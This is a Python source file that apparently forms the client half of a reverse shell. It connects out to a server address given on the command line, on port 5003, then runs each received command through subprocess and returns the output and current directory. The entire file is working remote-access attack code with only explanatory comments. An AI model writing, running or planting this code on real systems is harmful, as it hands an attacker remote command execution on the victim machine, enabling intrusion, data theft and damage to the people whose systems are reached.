import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1] # IP of host running server code. (`SERVER_HOST` = 127.0.0.1 if both codes are running on the same machine)
SERVER_PORT = 5003 # port on which server is listening
BUFFER_SIZE = 1024 * 128 # send 1024 (1kb) a time (as buffer size)
SEPARATOR = "<sep>" # separator string for sending 2 messages in one go


s = socket.socket()

# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()

    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    
    # get the current working directory as output
    cwd = os.getcwd()

    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

# close client connection
s.close()